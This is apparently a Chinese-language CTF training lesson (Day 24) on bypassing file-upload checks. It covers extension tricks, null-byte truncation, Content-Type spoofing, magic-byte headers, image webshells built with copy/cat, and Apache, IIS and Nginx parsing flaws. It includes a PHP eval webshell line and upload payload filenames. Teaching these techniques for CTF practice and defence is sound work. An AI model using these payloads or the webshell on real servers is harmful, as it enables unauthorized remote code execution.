# Day 24：文件上传绕过技巧——突破服务器防线

> **学习目标**：掌握文件上传漏洞的各种绕过方法，学会突破服务器的安全限制
> 
> **学习时长**：2小时
> 
> **难度等级**：⭐⭐⭐⭐⭐

---

## 📚 今日内容概览

1. 常见绕过方法汇总
2. 扩展名绕过技巧
3. MIME类型绕过
4. 文件内容绕过
5. 解析漏洞利用
6. 实战练习

---

## 一、常见绕过方法汇总

### 1.1 绕过方法分类

```
绕过方法分类：
  1. 前端验证绕过
  2. 文件扩展名绕过
  3. MIME类型绕过
  4. 文件内容绕过
  5. 解析漏洞利用
  6. 路径遍历绕过
  7. 特殊字符绕过

选择策略：
  1. 先尝试简单的绕过方法
  2. 如果失败，尝试更复杂的方法
  3. 根据服务器配置选择合适的方法
```

### 1.2 绕过流程

```
绕过流程：
  1. 分析验证方式
     - 前端验证：禁用JS或修改请求
     - 后端验证：需要更复杂的方法
  
  2. 尝试扩展名绕过
     - 大小写混淆
     - 双扩展名
     - 特殊字符
  
  3. 尝试MIME类型绕过
     - 修改Content-Type
     - 伪造MIME类型
  
  4. 尝试文件内容绕过
     - 图片马
     - 修改文件头
  
  5. 尝试解析漏洞
     - Apache解析漏洞
     - IIS解析漏洞
```

---

## 二、扩展名绕过技巧

### 2.1 大小写混淆

```
原理：
  服务器可能只检查小写扩展名
  使用大小写混合可以绕过检查

Payload：
  - shell.PhP
  - shell.pHp
  - shell.PHP
  
示例：
  上传文件名为shell.PhP
  如果服务器只检查小写扩展名，可能会绕过
  
适用场景：
  - 后端使用strtolower()转换后检查
  - 但如果先转换再检查，这种方法无效
  
注意：
  现代服务器通常会处理大小写问题
  这种方法成功率较低
```

### 2.2 双扩展名

```
原理：
  服务器可能只检查最后一个扩展名
  使用双扩展名可以绕过检查

Payload：
  - shell.php.jpg
  - shell.php.gif
  - shell.php.png
  
示例：
  上传文件名为shell.php.jpg
  服务器检查扩展名jpg，允许上传
  如果服务器解析时使用第一个扩展名，就会执行PHP代码
  
适用场景：
  - 服务器只检查文件的最后一个扩展名
  - 需要配合解析漏洞使用
  
注意：
  需要服务器存在解析漏洞才能执行代码
```

### 2.3 特殊字符绕过

```
原理：
  使用特殊字符干扰扩展名检查
  服务器可能会忽略这些字符

Payload：
  - shell.php.
  - shell.php_
  - shell.php%00.jpg
  - shell.php/
  - shell.php..
  
示例1：shell.php.
  某些服务器会自动去掉末尾的点
  最终文件名为shell.php
  
示例2：shell.php%00.jpg
  利用PHP的NULL字符截断
  %00会被解析为NULL，后面的内容被忽略
  需要PHP版本低于5.3.4
  
示例3：shell.php/
  在Windows系统中，末尾的斜杠会被去掉
  最终文件名为shell.php
  
适用场景：
  - 服务器没有正确处理特殊字符
  - PHP版本较低（<5.3.4）
```

### 2.4 利用解析漏洞

```
原理：
  某些Web服务器存在解析漏洞
  可以利用这些漏洞执行脚本

常见解析漏洞：
  1. Apache解析漏洞：
     - Apache会从右到左解析扩展名
     - 如果遇到无法识别的扩展名，继续向左解析
     - 示例：shell.php.xxx → shell.php
  
  2. IIS解析漏洞：
     - IIS 6.0存在解析漏洞
     - shell.asp;.jpg会被解析为ASP文件
     - shell.php;.jpg会被解析为PHP文件
  
  3. Nginx解析漏洞：
     - 某些版本的Nginx存在解析漏洞
     - /shell.jpg/shell.php会被解析为PHP文件
  
示例：
  上传shell.php.xxx
  Apache无法识别.xxx扩展名，继续向左解析
  最终解析为shell.php，执行PHP代码
```

### 2.5 利用可执行扩展名

```
原理：
  服务器可能允许某些不常见但可执行的扩展名

可执行扩展名列表：
  - .php
  - .php5
  - .php4
  - .php3
  - .phtml
  - .phps
  - .asp
  - .aspx
  - .jsp
  - .jspx
  
示例：
  如果服务器不允许.php扩展名
  可以尝试上传shell.php5
  如果服务器配置了解析.php5为PHP，就能执行代码
  
适用场景：
  - 服务器配置了解析其他PHP扩展名
  - 需要提前探测服务器支持的扩展名
```

---

## 三、MIME类型绕过

### 3.1 修改Content-Type

```
原理：
  服务器可能只检查请求中的Content-Type字段
  修改这个字段可以绕过验证

常见MIME类型：
  - 图片类型：image/jpeg, image/png, image/gif
  - 文档类型：application/pdf, application/doc
  - 文本类型：text/plain, text/html
  
示例：
  原始请求：
  Content-Type: application/x-php
  
  修改后：
  Content-Type: image/jpeg
  
步骤：
  1. 使用Burp抓包
  2. 找到Content-Type字段
  3. 修改为允许的MIME类型
  4. 发送请求
  
适用场景：
  - 服务器只检查Content-Type
  - 没有验证文件内容
```

### 3.2 伪造MIME类型

```
原理：
  使用不常见但合法的MIME类型

Payload：
  - Content-Type: image/jpeg; charset=UTF-8
  - Content-Type: image/png; boundary=something
  - Content-Type: application/octet-stream
  
示例：
  上传PHP文件，但Content-Type设置为application/octet-stream
  如果服务器允许这个MIME类型，就能绕过验证
  
适用场景：
  - 服务器的白名单包含application/octet-stream
  - 需要探测服务器允许的MIME类型
```

### 3.3 利用文件头伪造

```
原理：
  在文件开头添加正确的文件头
  使服务器认为是合法文件

常见文件头：
  - JPEG：FF D8 FF E0
  - PNG：89 50 4E 47
  - GIF：47 49 46 38
  - PDF：%PDF-
  
示例：
  创建一个文件，开头是PNG文件头，后面是PHP代码：
  \x89\x50\x4E\x47\x0D\x0A\x1A\x0A<?php eval($_POST['cmd']); ?>
  
  上传这个文件，服务器检查文件头认为是PNG图片
  但实际上包含PHP代码
  
适用场景：
  - 服务器只检查文件头
  - 需要配合解析漏洞使用
```

---

## 四、文件内容绕过

### 4.1 图片马制作

```
原理：
  将恶意代码嵌入到合法的图片文件中
  
方法1：使用copy命令（Windows）
  copy /b image.jpg + shell.php webshell.jpg
  
方法2：使用cat命令（Linux）
  cat image.jpg shell.php > webshell.jpg
  
方法3：使用十六进制编辑器
  在图片文件末尾添加PHP代码
  
示例：
  1. 准备一个正常的图片文件（image.jpg）
  2. 准备一个PHP WebShell（shell.php）
  3. 使用copy命令合并：copy /b image.jpg + shell.php webshell.jpg
  4. 上传webshell.jpg
  
注意：
  需要服务器存在文件包含漏洞或解析漏洞才能执行代码
```

### 4.2 修改文件头

```
原理：
  在恶意文件开头添加正确的文件头
  
示例：
  原始PHP文件：
  <?php eval($_POST['cmd']); ?>
  
  修改后：
  \xFF\xD8\xFF\xE0<?php eval($_POST['cmd']); ?>
  
  添加JPEG文件头后，服务器可能认为是JPEG图片
  
适用场景：
  - 服务器只检查文件头
  - 需要配合解析漏洞使用
```

### 4.3 使用合法文件内容

```
原理：
  使用合法的文件内容，但包含隐藏的恶意代码
  
示例：
  创建一个PDF文件，其中包含PHP代码
  或者创建一个Word文档，其中包含恶意宏
  
适用场景：
  - 服务器允许上传PDF或文档文件
  - 需要其他漏洞配合执行
```

---

## 五、解析漏洞利用

### 5.1 Apache解析漏洞

```
漏洞原理：
  Apache从右到左解析扩展名
  如果遇到无法识别的扩展名，继续向左解析
  直到找到可识别的扩展名
  
示例：
  文件：shell.php.xxx
  Apache无法识别.xxx，继续向左
  找到.php，解析为PHP文件
  
利用方法：
  1. 上传文件名为shell.php.xxx
  2. 访问http://example.com/uploads/shell.php.xxx
  3. Apache解析为PHP文件，执行代码
  
注意：
  需要Apache配置了PHP解析
  某些配置可能会阻止这种攻击
```

### 5.2 IIS解析漏洞

```
漏洞原理：
  IIS 6.0存在解析漏洞
  使用分号分隔扩展名时，只解析第一个扩展名
  
示例：
  文件：shell.asp;.jpg
  IIS解析为ASP文件
  
  文件：shell.php;.jpg
  如果服务器配置了解析PHP，会解析为PHP文件
  
利用方法：
  1. 上传文件名为shell.asp;.jpg
  2. 访问http://example.com/uploads/shell.asp;.jpg
  3. IIS解析为ASP文件，执行代码
  
注意：
  主要影响IIS 6.0版本
  新版本的IIS已经修复了这个漏洞
```

### 5.3 Nginx解析漏洞

```
漏洞原理：
  某些版本的Nginx存在解析漏洞
  /shell.jpg/shell.php会被解析为PHP文件
  
示例：
  上传文件名为shell.jpg（包含PHP代码）
  访问http://example.com/uploads/shell.jpg/shell.php
  Nginx会将请求转发给PHP解析器
  
利用方法：
  1. 上传shell.jpg（包含PHP代码）
  2. 访问http://example.com/uploads/shell.jpg/shell.php
  3. Nginx解析为PHP文件，执行代码
  
注意：
  影响特定版本的Nginx
  需要服务器配置了PHP解析
```

---

## 六、实战练习

### 6.1 练习1：绕过扩展名验证

```
题目：
  后端验证文件扩展名，只允许jpg、png、gif
  
步骤：
  1. 准备PHP WebShell：shell.php
  2. 使用Burp抓包上传请求
  3. 修改文件名为shell.php.jpg
  4. 发送请求，查看是否上传成功
  5. 如果成功，尝试访问文件
  6. 如果服务器存在解析漏洞，代码会执行
  
预期结果：
  如果服务器存在Apache解析漏洞，shell.php.jpg会被解析为PHP文件
  可以通过POST参数cmd执行命令
```

### 6.2 练习2：图片马上传

```
题目：
  后端使用getimagesize()验证图片
  
步骤：
  1. 准备一个正常的图片文件：image.jpg
  2. 准备一个PHP WebShell：shell.php
  3. 使用copy命令合并：copy /b image.jpg + shell.php webshell.jpg
  4. 上传webshell.jpg
  5. 服务器使用getimagesize()验证，认为是合法图片
  6. 文件被成功上传
  7. 寻找文件包含漏洞或解析漏洞执行代码
  
预期结果：
  如果存在文件包含漏洞，可以通过包含webshell.jpg执行代码
```

### 6.3 练习3：利用解析漏洞

```
题目：
  服务器使用Apache，存在解析漏洞
  
步骤：
  1. 准备PHP WebShell
  2. 上传文件名为shell.php.xxx
  3. 访问http://example.com/uploads/shell.php.xxx
  4. Apache解析为PHP文件
  5. 执行代码获取Flag
  
预期结果：
  代码执行成功，获取Flag
```

---

## 七、常见问题解决

### 7.1 问题1：文件上传成功但无法执行

```
现象：
  文件上传成功，但访问时显示为纯文本或图片
  
解决方法：
  1. 检查服务器是否解析该扩展名
  2. 尝试使用不同的扩展名
  3. 寻找文件包含漏洞
  4. 利用解析漏洞
  
示例：
  如果上传的shell.php.jpg显示为图片
  尝试访问shell.php.jpg/.php（如果存在Nginx漏洞）
```

### 7.2 问题2：文件名被修改

```
现象：
  上传后文件名被服务器修改（如添加随机字符串）
  
解决方法：
  1. 寻找文件存储路径
  2. 如果路径可预测，可以尝试暴力破解文件名
  3. 如果路径不可预测，需要其他漏洞配合
  
示例：
  如果服务器使用md5(uniqid())作为文件名
  可以尝试暴力破解可能的文件名
```

### 7.3 问题3：上传目录不可访问

```
现象：
  文件上传成功，但无法通过Web访问
  
解决方法：
  1. 寻找其他漏洞（如文件包含）
  2. 如果服务器允许目录遍历，可以尝试访问
  3. 使用绝对路径访问
  
示例：
  如果上传到非Web目录，可以尝试文件包含漏洞读取文件内容
```

---

## 八、今日总结

### 8.1 知识点回顾

```
✅ 扩展名绕过技巧
  - 大小写混淆
  - 双扩展名
  - 特殊字符绕过
  - 利用解析漏洞
  - 利用可执行扩展名
  
✅ MIME类型绕过
  - 修改Content-Type
  - 伪造MIME类型
  - 利用文件头伪造
  
✅ 文件内容绕过
  - 图片马制作
  - 修改文件头
  - 使用合法文件内容
  
✅ 解析漏洞利用
  - Apache解析漏洞
  - IIS解析漏洞
  - Nginx解析漏洞
  
✅ 实战练习
  - 绕过扩展名验证
  - 图片马上传
  - 利用解析漏洞
```

### 8.2 关键记忆点

```
记住这个口诀：

文件上传绕过多，方法多样要记牢；
扩展名大小写混淆，双扩展名来迷惑；
特殊字符能截断，NULL字节最经典；
图片马要会做，copy命令来合并；
解析漏洞要利用，Apache、IIS、Nginx！

流程：
  分析验证方式 → 选择绕过方法 → 上传恶意文件 → 执行代码获取Flag
```

### 8.3 今日作业

```
必做题：
  1. 创建一个图片马
  2. 练习绕过扩展名验证
  3. 练习利用解析漏洞

选做题：
  1. 研究不同Web服务器的解析漏洞
  2. 练习各种绕过方法的组合
  3. 在CTFHub找文件上传题目练习

提交内容：
  - 图片马文件（或代码）
  - 绕过步骤记录
  - 截图
```

### 8.4 明日预告

```
Day 25：文件包含漏洞

学习内容：
  - 文件包含漏洞原理
  - 本地文件包含
  - 远程文件包含
  - 实战练习
```

---

**恭喜你完成Day 24的学习！明天学习文件包含漏洞！** 🎉
